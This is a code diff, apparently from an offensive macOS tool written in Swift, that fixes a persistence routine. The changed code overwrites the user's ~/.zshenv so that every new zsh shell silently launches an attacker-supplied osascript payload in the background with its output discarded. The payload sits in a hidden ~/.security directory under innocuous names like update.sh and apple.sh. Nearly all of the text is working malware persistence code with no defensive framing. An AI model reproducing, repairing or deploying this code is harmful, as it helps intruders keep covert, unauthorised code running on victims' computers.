@@ -17,7 +17,7 @@ else {
         'RUNNING=$(ps ax | grep osascript | wc -l);
         if [ "$RUNNING" -lt 2 ]
         then
-          cd ' + userHome + '/.security
+          cd \(home)/.security
           ./update.sh &
         else
           exit
@@ -50,7 +50,7 @@ else {
             
             //writing for newer versions of macOS that use zsh:
             var profilePath = "\(home)/.zshenv"
-            try profilePath.write(to: URL(fileURLWithPath: profilePath), atomically: false, encoding: String.Encoding.utf8)
+            try profile.write(to: URL(fileURLWithPath: profilePath), atomically: false, encoding: String.Encoding.utf8)
 
             output += "Persitence installed at \(home)/.zshenv and \(home)/.security/apple.sh"
             
@@ -62,17 +62,28 @@ else {
             'RUNNING=$(ps ax | grep osascript | wc -l);
             if [ "$RUNNING" -lt 2 ]
             then
-              setopt LOCAL_OPTIONS NO_MONITOR; nohup payload > /dev/null 2>&1&
+              setopt LOCAL_OPTIONS NO_MONITOR; nohup \(payload) > /dev/null 2>&1&
+            else
+              setopt LOCAL_OPTIONS NO_MONITOR; exit > /dev/null 2>&1&
+            fi'
+            """
+            
+            var persist = "osascript " + CommandLine.arguments[1]
+            
+            var payload2 = """
+            'RUNNING=$(ps ax | grep osascript | wc -l);
+            if [ "$RUNNING" -lt 2 ]
+            then
+              setopt LOCAL_OPTIONS NO_MONITOR; nohup \(persist) > /dev/null 2>&1&
             else
               setopt LOCAL_OPTIONS NO_MONITOR; exit > /dev/null 2>&1&
             fi'
             """
             
             
-            var persist = "osascript " + CommandLine.arguments[1]
+          
             var profilePath = "\(home)/.zshenv"
-            var updatedPayload = payload.replacingOccurrences(of: "payload", with: persist)
-            try updatedPayload.write(to: URL(fileURLWithPath: profilePath), atomically: false, encoding: String.Encoding.utf8)
+            try payload2.write(to: URL(fileURLWithPath: profilePath), atomically: false, encoding: String.Encoding.utf8)
             output += "Persistence installed at \(home)/.zshenv"
         }
         
@@ -82,5 +93,3 @@ else {
         print(error)
     }
 }
-
-
